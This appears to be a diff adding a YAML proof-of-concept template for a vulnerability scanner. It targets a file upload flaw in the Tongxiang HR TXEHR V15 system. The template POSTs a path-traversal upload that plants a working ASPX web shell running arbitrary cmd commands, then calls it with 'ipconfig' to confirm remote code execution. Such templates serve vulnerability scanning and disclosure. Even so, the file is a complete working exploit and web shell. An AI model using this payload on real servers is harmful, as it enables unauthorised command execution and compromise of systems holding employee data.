@@ -1,0 +1,51 @@
+name: poc-yaml-tongxiangHR-TXEHR_V15_hdlUploadFile-File-upload
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/rce
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+      body: |
+        -----------------------------142851345723692939351758052805
+        Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
+        Content-Type: text/plain
+
+        <%@ Page Language="Jscript" validateRequest="false" %>
+        <%
+        var c=new System.Diagnostics.ProcessStartInfo("cmd");
+        var e=new System.Diagnostics.Process();
+        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+        c.UseShellExecute=false;
+        c.RedirectStandardOutput=true;
+        c.RedirectStandardError=true;
+        e.StartInfo=c;
+        c.Arguments="/c " + Request.Item["cmd"];
+        e.Start();
+        out=e.StandardOutput;
+        EI=e.StandardError;
+        e.Close();
+        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+        System.IO.File.Delete(Request.PhysicalPath);
+        Response.End();%>
+        -----------------------------142851345723692939351758052805--
+
+    expression: response.status == 200
+
+
+  r1:
+    request:
+      method: GET
+      path: /Style/rce.aspx?cmd=ipconfig
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486126&idx=1&sn=f5fb3bd6c1284bcff3e5b266892c320e&chksm=c267bf9df510368b20023fc9f814aec2ffcbe96b4140cde34cabec6934562d896e64107664b3&token=803667191&lang=zh_CN#rd
